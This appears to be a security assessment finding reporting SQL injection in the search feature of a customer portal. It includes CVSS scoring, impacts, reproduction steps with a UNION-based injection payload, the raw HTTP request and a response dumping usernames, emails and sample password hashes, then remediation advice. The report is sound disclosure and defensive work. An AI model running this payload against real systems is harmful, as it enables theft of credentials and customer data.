# SQL Injection in Customer Portal Search

**Severity:** Critical
**CVSS3:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Component:** portal.acme.com - Search functionality
**Status:** Confirmed

## Description

The customer portal's search functionality is vulnerable to SQL injection via the 'query' parameter. An unauthenticated attacker can execute arbitrary SQL commands, leading to full database compromise including extraction of sensitive customer data, user credentials, and administrative access.

## Impact

- Complete database compromise (read/write/delete)
- Extraction of all customer PII (names, emails, addresses, payment info)
- User credential theft (password hashes)
- Potential OS command execution via SQL Server xp_cmdshell
- Complete application takeover via admin account access

## Steps to Reproduce

1. Navigate to https://portal.acme.com/search
2. Enter the following payload in the search box:
   `' OR 1=1 UNION SELECT NULL,username,password,email,NULL FROM users--`
3. Submit the search form
4. Observe all user records including password hashes returned in results

## Request

~~~http
POST /api/search HTTP/1.1
Host: portal.acme.com
Content-Type: application/json
Content-Length: 89

{
  "query": "' OR 1=1 UNION SELECT NULL,username,password,email,NULL FROM users--"
}
~~~

## Response

~~~http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "results": [
    {
      "id": null,
      "name": "admin",
      "description": "$2b$12$KIXxh5JKcoI.Hn7idQYLn.qP2M7c",
      "category": "admin@acme.com",
      "price": null
    },
    {
      "id": null,
      "name": "jsmith",
      "description": "$2b$12$vAXrG42PLqE4jxwIHNxw/.",
      "category": "john.smith@acme.com",
      "price": null
    }
  ]
}
~~~

## Screenshots

- screenshots/sqli-search-page.png
- screenshots/sqli-payload-response.png
- screenshots/sqli-extracted-users.png

## Remediation

1. **Immediate:** Disable search functionality until patched
2. **Short-term:** Implement prepared statements/parameterized queries
3. **Long-term:**
   - Use ORM framework with built-in SQL injection prevention
   - Implement input validation and sanitization
   - Apply principle of least privilege to database user
   - Add Web Application Firewall (WAF) rules
   - Conduct code review of all database queries

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- MITRE ATT&CK T1190: Exploit Public-Facing Application
